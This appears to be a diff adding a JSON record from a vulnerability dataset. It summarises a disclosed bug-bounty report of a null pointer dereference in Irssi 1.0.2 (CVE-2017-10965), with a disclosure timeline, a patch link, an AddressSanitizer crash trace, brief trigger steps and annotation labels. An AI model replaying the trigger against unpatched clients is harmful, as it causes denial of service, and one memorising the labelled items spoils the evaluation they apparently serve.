@@ -1,0 +1,38 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "geeknik ",
+  "title": "CVE-2017-10965: Null pointer dereference in Irssi <1.0.4 ",
+  "content": "\n34 days after reading https://irssi.org/2017/05/12/fuzzing-irssi/, I was finally able to trigger a null pointer dereference in irssi 1.0.2.\nTimeline:\nReport to vendor: 15 June 2017\nAcknowledge by vendor: 15 June 2017\nFixed by vendor: 7 July 2017\nAdvisory:\nhttp://seclists.org/oss-sec/2017/q3/80\nPatch:\nhttps://github.com/irssi/irssi/commit/5e26325317c72a04c1610ad952974e206\nCode 2.18 KiB\n1./irssi < test000\n2CAP LS\n3NICK root\n4USER root root /dev/stdin :root\n5ASAN:DEADLYSIGNAL\n6=================================================================\n7==23308==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f4505521e56 bp 0x7fff0bf30d90 sp 0x7fff0bf30518 T0)\n8==23308==The signal is caused by a READ memory access.\n9==23308==Hint: address points to the zero page.\n10    #0 0x7f4505521e55 in strlen /build/glibc-cxyGtm/glibc-2.24/string/../sysdeps/x86_64/strlen.S:76\n11    #1 0x4536dc in __interceptor_strlen.part.31 (/root/irssi-1.0.2/src/fe-text/irssi+0x4536dc)\n12    #2 0x6bf3c9 in my_asctime /root/irssi-1.0.2/src/core/misc.c:565:8\n13    #3 0x594d51 in event_topic_info /root/irssi-1.0.2/src/fe-common/irc/fe-events-numeric.c:275:19\n14    #4 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n15    #5 0x6f4207 in signal_emit /root/irssi-1.0.2/src/core/signals.c:286:3\n16    #6 0x62cd3d in irc_server_event /root/irssi-1.0.2/src/irc/core/irc.c:308:7\n17    #7 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n18    #8 0x6f59b6 in signal_emit_id /root/irssi-1.0.2/src/core/signals.c:304:3\n19    #9 0x62d33a in irc_parse_incoming_line /root/irssi-1.0.2/src/irc/core/irc.c:362:3\n20    #10 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n21    #11 0x6f59b6 in signal_emit_id /root/irssi-1.0.2/src/core/signals.c:304:3\n22    #12 0x62d6ba in irc_parse_incoming /root/irssi-1.0.2/src/irc/core/irc.c:383:3\n23    #13 0x6bb9b2 in irssi_io_invoke /root/irssi-1.0.2/src/core/misc.c:55:3\n24    #14 0x7f4506cc6229 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a229)\n25    #15 0x7f4506cc65df  (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a5df)\n26    #16 0x7f4506cc668b in g_main_context_iteration (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a68b)\n27    #17 0x57e4a7 in main /root/irssi-1.0.2/src/fe-text/irssi.c:326:3\n28    #18 0x7f45054b53f0 in __libc_start_main /build/glibc-cxyGtm/glibc-2.24/csu/../csu/libc-start.c:291\n29    #19 0x42e979 in _start (/root/irssi-1.0.2/src/fe-text/irssi+0x42e979)\n30\n31AddressSanitizer can not provide additional info.\n32SUMMARY: AddressSanitizer: SEGV /build/glibc-cxyGtm/glibc-2.24/string/../sysdeps/x86_64/strlen.S:76 in strlen\n33==23308==ABORTING\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "NULL Pointer Dereference"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1570225200,
+  "report_url": "https://hackerone.com/reports/247027",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Run irssi with a specially crafted input file: ./irssi < test000"
+    ],
+    [
+      2,
+      "Send specific IRC commands to trigger the null pointer dereference: CAP LS, NICK root, USER root root /dev/stdin :root"
+    ]
+  ],
+  "vuln_description": "A null pointer dereference vulnerability in Irssi version 1.0.2, which can be triggered by sending specific IRC commands, leading to a segmentation fault and potential denial of service.",
+  "reason": "The vulnerability involves a straightforward sequence of IRC commands that trigger a null pointer dereference. The attack does not require complex interactions or manipulation of application states, and the logic is not novel.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
